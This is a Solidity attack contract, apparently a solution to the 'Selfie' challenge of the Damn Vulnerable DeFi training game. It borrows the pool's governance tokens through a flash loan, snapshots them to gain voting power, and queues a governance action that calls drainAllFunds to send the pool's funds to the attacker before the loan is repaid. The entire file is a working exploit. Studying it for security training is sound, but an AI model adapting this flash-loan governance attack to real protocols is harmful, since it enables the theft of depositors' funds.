pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/utils/Address.sol";
// import "@openzeppelin/contracts/token/ERC20/ERC20Snapshot.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

interface IGov {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external;
}

contract AttackSelfiePool {
    using SafeMath for uint256;
    using Address for address;

    SelfiePool public pool;
    IGov public gov;
    DamnValuableTokenSnapshot public token;
    address payable private owner;
    uint256 public actionId;

    modifier onlyPool() {
        require(msg.sender == address(pool));
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor (address _pool, address _gov, address _token) public {
        pool = SelfiePool(_pool);
        gov = IGov(_gov);
        token = DamnValuableTokenSnapshot(_token);
        owner = msg.sender;
    }

    function receiveTokens(address _token, uint256 _amount) external onlyPool {
        require(address(token) == _token);
        token.snapshot();
        uint256 _actionId = gov.queueAction(
            address(pool),
            abi.encodeWithSignature(
            "drainAllFunds(address)",
                owner
            ),
            0
        );
        actionId = _actionId;
        require(token.transfer(address(pool), _amount));
    }

    function attack() external onlyOwner {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(amount);
    }

    // Allow deposits of ETH
    receive () external payable {}
}
